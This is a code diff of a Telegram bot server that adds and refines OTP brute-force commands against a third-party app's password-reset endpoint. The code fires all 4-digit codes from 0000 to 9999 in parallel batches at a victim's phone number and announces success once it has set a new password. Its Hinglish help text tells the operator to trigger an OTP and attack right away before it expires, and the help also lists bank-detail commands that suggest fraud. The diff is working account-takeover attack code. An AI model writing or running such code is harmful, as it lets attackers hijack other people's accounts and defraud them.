@@ -679,9 +679,9 @@ app.post('/bot-webhook', async (req, res) => {
 /idtrack — Show all tracked user IDs
 
 === OTP BRUTE FORCE ===
-/bruteforce — Help & instructions
-/bruteforce phone|newPass — Full scan 0000-9999
-/bruteforce phone|newPass|0|4999 — Custom range
+/tryotp phone|pass|otp — Test single OTP
+/bruteforce phone|pass — Full scan 0000-9999
+/bruteforce phone|pass|0|4999 — Custom range
 
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
@@ -983,10 +983,36 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/tryotp ')) {
+      const args = text.substring(8).trim();
+      const parts = args.split('|').map(s => s.trim());
+      if (parts.length < 3) {
+        await bot.sendMessage(chatId, '❌ Format: /tryotp phone|newPassword|otp\nExample: /tryotp 6206785398|MyPass123|1234');
+        return res.sendStatus(200);
+      }
+      const [tPhone, tPass, tOtp] = parts;
+      res.sendStatus(200);
+      try {
+        const r = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: tPhone, password: tPass, otp: tOtp })
+        });
+        const t = await r.text();
+        let j = null;
+        try { j = JSON.parse(t); } catch(e) {}
+        const isSuccess = j && j.code === 1000;
+        await bot.sendMessage(chatId, `${isSuccess ? '✅ SUCCESS!' : '❌ Failed'}\n\n📤 Sent:\n${JSON.stringify({ phone: tPhone, password: tPass, otp: tOtp }, null, 2)}\n\n📥 Response:\n${j ? JSON.stringify(j, null, 2) : t}`);
+      } catch(e) {
+        await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
+      }
+      return;
+    }
+
     if (text.startsWith('/bruteforce')) {
       const args = text.substring(11).trim();
       if (!args) {
-        await bot.sendMessage(chatId, `🔓 OTP Brute Force — Password Reset\n\n📋 Steps:\n1️⃣ App mein jaao → Reset Password\n2️⃣ Phone number daalo → Send OTP dabao\n3️⃣ Turant yeh command run karo:\n\n/bruteforce phone|newPassword\n/bruteforce phone|newPassword|0|4999\n/bruteforce phone|newPassword|5000|9999\n\n📌 Default range: 0000-9999\n⚡ Speed: ~30 codes/sec\n⏱ Full scan: ~5-6 min`);
+        await bot.sendMessage(chatId, `🔓 OTP Brute Force — Password Reset\n\n📋 Steps:\n1️⃣ App → Reset Password → Send OTP\n2️⃣ Turant bot mein command run karo\n\n📌 Commands:\n/tryotp phone|pass|otp — Single OTP test\n/bruteforce phone|pass — Full 0000-9999\n/bruteforce phone|pass|0|4999 — Custom range\n\n⚡ Speed: ~30 codes/sec\n⏱ Full scan: ~5-6 min`);
         return res.sendStatus(200);
       }
       const parts = args.split('|').map(s => s.trim());
@@ -1006,20 +1032,20 @@ Example:
       res.sendStatus(200);
       bruteForceActive = true;
 
-      await bot.sendMessage(chatId, `🚀 Brute Force Started\n📱 Phone: ${bfPhone}\n🔑 New Pass: ${bfPass}\n🎯 Range: ${String(bfStart).padStart(4,'0')} → ${String(bfEnd).padStart(4,'0')} (${totalCodes} codes)\n\n⏳ Step 1: Capturing fail response...`);
+      await bot.sendMessage(chatId, `🚀 Brute Force Started\n📱 Phone: ${bfPhone}\n🔑 New Pass: ${bfPass}\n🎯 Range: ${String(bfStart).padStart(4,'0')} → ${String(bfEnd).padStart(4,'0')} (${totalCodes} codes)\n\n⏳ Capturing fail response...`);
 
       try {
         const testRes = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userName: bfPhone, phone: bfPhone, password: bfPass, smsCode: '@@@@', code: '@@@@', verifyCode: '@@@@' })
+          body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: '@@@@' })
         });
         const testText = await testRes.text();
         let testJson = null;
         try { testJson = JSON.parse(testText); } catch(e) {}
         const failCode = testJson?.code;
         const failMsg = (testJson?.message || testJson?.msg || '').toLowerCase();
-        await bot.sendMessage(chatId, `🔍 Fail Response Captured:\nCode: ${failCode}\nMsg: ${testJson?.message || testJson?.msg || testText}\n\n⏳ Step 2: Brute forcing ${totalCodes} codes...\n(Updates every 500 codes)`);
+        await bot.sendMessage(chatId, `🔍 Fail = code:${failCode} "${testJson?.message || failMsg}"\n\n⏳ Brute forcing... (updates every 500)`);
 
         const BATCH = 30;
         let found = false;
@@ -1033,18 +1059,18 @@ Example:
           const batchEnd = Math.min(batch + BATCH - 1, bfEnd);
           const promises = [];
           for (let i = batch; i <= batchEnd; i++) {
-            const code = String(i).padStart(4, '0');
+            const otp = String(i).padStart(4, '0');
             promises.push(
               fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userName: bfPhone, phone: bfPhone, password: bfPass, smsCode: code, code: code, verifyCode: code })
+                body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: otp })
               }).then(async r => {
                 const t = await r.text();
                 let j = null;
                 try { j = JSON.parse(t); } catch(e) {}
-                return { code, json: j, text: t, ok: true };
-              }).catch(e => ({ code, json: null, text: e.message, ok: false }))
+                return { otp, json: j, text: t, ok: true };
+              }).catch(e => ({ otp, json: null, text: e.message, ok: false }))
             );
           }
           const results = await Promise.all(promises);
@@ -1057,25 +1083,25 @@ Example:
             const rm = (r.json?.message || r.json?.msg || '').toLowerCase();
             if (rc !== failCode || rm !== failMsg) {
               found = true;
-              foundCode = r.code;
+              foundCode = r.otp;
               foundResp = r.json ? JSON.stringify(r.json, null, 2) : r.text;
             }
           }
 
           const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-          const speed = elapsed > 0 ? (tried / (elapsed / 1)).toFixed(0) : '0';
+          const speed = elapsed > 0 ? (tried / parseFloat(elapsed)).toFixed(0) : '0';
           const pct = ((tried / totalCodes) * 100).toFixed(1);
           if (!found && (tried % 500 < BATCH || tried >= totalCodes)) {
-            await bot.sendMessage(chatId, `⏳ ${tried}/${totalCodes} (${pct}%) | ⏱${elapsed}s | 🚀${speed}/s${errors ? ' | ❌' + errors + ' errors' : ''}\nRange: ${String(batch).padStart(4,'0')}-${String(batchEnd).padStart(4,'0')}`).catch(()=>{});
+            await bot.sendMessage(chatId, `⏳ ${tried}/${totalCodes} (${pct}%) | ${elapsed}s | ${speed}/s${errors ? ' | ❌' + errors : ''}`).catch(()=>{});
           }
         }
 
         bruteForceActive = false;
         const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
         if (found) {
-          await bot.sendMessage(chatId, `✅✅✅ PASSWORD RESET SUCCESS!\n\n🔑 OTP: ${foundCode}\n📱 Phone: ${bfPhone}\n🔐 New Password: ${bfPass}\n⏱ Time: ${totalTime}s\n📊 Tried: ${tried} codes\n\n📋 Server Response:\n${foundResp}`);
+          await bot.sendMessage(chatId, `✅✅✅ PASSWORD RESET SUCCESS!\n\n🔑 OTP: ${foundCode}\n📱 Phone: ${bfPhone}\n🔐 New Password: ${bfPass}\n⏱ Time: ${totalTime}s\n📊 Tried: ${tried}\n\n📋 Response:\n${foundResp}`);
         } else {
-          await bot.sendMessage(chatId, `❌ OTP Not Found\n\n📊 Tried: ${tried} codes (${String(bfStart).padStart(4,'0')}-${String(bfEnd).padStart(4,'0')})\n⏱ Time: ${totalTime}s${errors ? '\n❌ Errors: ' + errors : ''}\n\n💡 Tips:\n1. App mein Send OTP dabao\n2. Turant /bruteforce run karo\n3. OTP 5 min mein expire hota hai`);
+          await bot.sendMessage(chatId, `❌ Not Found\n📊 ${tried} codes (${String(bfStart).padStart(4,'0')}-${String(bfEnd).padStart(4,'0')})\n⏱ ${totalTime}s${errors ? ' | ❌' + errors + ' errors' : ''}\n\n💡 App mein Send OTP dabao, turant /bruteforce run karo`);
         }
       } catch(e) {
         bruteForceActive = false;
